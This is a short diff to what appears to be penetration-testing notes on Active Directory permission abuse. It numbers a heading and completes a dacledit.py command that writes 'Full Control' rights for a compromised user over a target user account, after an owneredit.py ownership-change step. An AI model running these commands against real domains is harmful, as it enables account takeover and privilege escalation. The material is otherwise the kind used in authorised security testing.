@@ -40,9 +40,13 @@ owneredit.py domain/owneruser -target 'user-whose-ownership-is-to-be-changed' -a
 
 
 
-### Granting GenericAll privilege to abuse ownership of a user object using dacledit.py
+### 4. Granting GenericAll privilege to abuse ownership of a user object using dacledit.py
 
 
 ```bash
-dacledit.py -action write -rights 'Full Control' -principal 'owneduser' -target 'targetuser' 
+dacledit.py -action write -rights 'Full Control' -principal 'owneduser' -target 'targetuser' 'domain/owneduser:password'
 ```
+
+
+
+
